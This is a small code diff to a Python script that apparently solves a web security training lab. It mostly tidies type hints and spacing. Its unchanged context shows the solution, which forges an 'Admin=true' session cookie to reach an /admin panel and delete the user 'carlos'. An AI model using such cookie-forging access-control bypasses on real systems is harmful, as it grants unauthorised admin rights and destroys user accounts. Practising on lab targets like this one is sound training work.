@@ -6,6 +6,7 @@ import bs4
 
 import lab_02
 
+
 class Lab(lab_02.Lab):
     """Wrapper"""
 
@@ -13,10 +14,9 @@ class Lab(lab_02.Lab):
         super().__init__()
         self.session = requests.Session()
 
-    def get(self, url: str, params: dict = None) -> requests.models.Response:
+    def get(self, url: str, params: dict | None = None) -> requests.models.Response:
         """Get url"""
-        response = self.session.get(url, params=params)
-        return response
+        return self.session.get(url, params=params)
 
     def csrf_token(self, path: str) -> str:
         """Get CSRF token"""
@@ -31,7 +31,7 @@ class Lab(lab_02.Lab):
         return csrf_token
 
     def login(self, username: str, password: str,
-              csrf: str = None) -> requests.models.Response:
+              csrf: str | None = None) -> requests.models.Response:
         """Log in"""
         payload = {"username": username, "password": password}
         if csrf is not None:
@@ -39,6 +39,7 @@ class Lab(lab_02.Lab):
         response = self.session.post(f"{self.url}/login", data=payload)
         response.raise_for_status()
         return response
+
 
 def main() -> None:
     """Entry point"""
@@ -49,6 +50,7 @@ def main() -> None:
     site.session.cookies["Admin"] = "true"
     response = site.delete_user(admin_panel="/admin", username="carlos")
     print(response.status_code)
+
 
 if __name__ == "__main__":
     main()
